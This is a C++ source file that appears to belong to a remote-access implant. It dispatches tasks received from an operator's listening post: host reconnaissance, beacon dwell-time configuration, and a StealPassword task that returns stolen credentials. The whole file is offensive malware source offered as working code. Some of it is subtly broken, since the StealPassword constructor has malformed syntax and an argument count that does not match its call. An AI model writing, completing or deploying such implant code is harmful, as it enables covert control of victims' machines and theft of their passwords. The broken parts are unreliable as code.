#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif

#include "tasks.h"
#include "implant.h"
#include "results.h"
#include "configuration.h"

#include <string>
#include <array>
#include <sstream>
#include <fstream>
#include <cstdlib>

#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/ptree.hpp>

#include <Windows.h>
#include <tlhelp32.h>


// Function to parse the tasks from the property tree returned by the listening post
// Execute each task according to the key specified (e.g. Got task_type of "ping"? Run the SituationalAwareness)
[[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
    std::function<void(const Configuration&)> setter) {
    // Get the task type and identifier, declare our variables
    const auto taskType = taskTree.get_child("task_type").get_value<std::string>();
    const auto idString = taskTree.get_child("task_id").get_value<std::string>();
    std::stringstream idStringStream{ idString };
    boost::uuids::uuid id{};
    idStringStream >> id;

    // Conditionals to determine which task should be executed based on key provided
    // REMEMBER: Any new tasks must be added to the conditional check, along with arg values
    // ===========================================================================================
    if (taskType == SituationalAwareness::key) {
        return SituationalAwareness{
            id
        };
    }
    if (taskType == ConfigureTask::key) {
        return ConfigureTask{
            id,
            taskTree.get_child("dwell").get_value<double>(),
            taskTree.get_child("running").get_value<bool>(),
            std::move(setter)
        };
    }

//if you wanna pass any parameters to the task, we declare those parameters within the task code
//ex: configure task
    if (taskType == StealPassword::key) {
        return StealPassword{
            id,
            taskTree.get_child("steal").get_value<std::string>()
        };
    }
    // ===========================================================================================

    // No conditionals matched, so an undefined task type must have been provided and we error out
    //ERROR IF NOTHING MATCHES
    std::string errorMsg{ "Illegal task type encountered: " };
    errorMsg.append(taskType);
    throw std::logic_error{ errorMsg };
}


// Tasks
// ===========================================================================================

// SituationalAwareness
// -------------------------------------------------------------------------------------------
SituationalAwareness::SituationalAwareness(const boost::uuids::uuid& id)
    : id{ id } {}

Result SituationalAwareness::run() const {
    //returns the result of sitAware() from implant.cpp in the form of a Result object 
    map<string, string> sitAwareResult = sitAware();
    return Result{ id, sitAwareResult, true };
    //parameters: id, contents, bool if it was successful
}

// Instantiate the implant configuration
Configuration::Configuration(const double meanDwell, const bool isRunning)
    : meanDwell(meanDwell), isRunning(isRunning) {}

// ConfigureTask
// -------------------------------------------------------------------------------------------
ConfigureTask::ConfigureTask(const boost::uuids::uuid& id,
    double meanDwell,
    bool isRunning,
    std::function<void(const Configuration&)> setter) //setter function
    : id{ id },
    meanDwell{ meanDwell }, //initiate dwell time and set true for isrunning
    isRunning{ isRunning },
    setter{ std::move(setter) } {}

Result ConfigureTask::run() const {
    // Call setter to set the implant configuration, mean dwell time and running status
    setter(Configuration{ meanDwell, isRunning });
    return Result{ id, "Configuration successful!", true };
}

// ===========================================================================================

// StealPassword
// -------------------------------------------------------------------------------------------
StealPassword::StealPassword(const boost::uuids::uuid& id)
    : id{ id },
    {} 

Result StealPassword::run() const {
    std::string result;
    //call stealPassword() from implant.cpp
    result = stealPassword();
    return Result{ id, result, true };
}
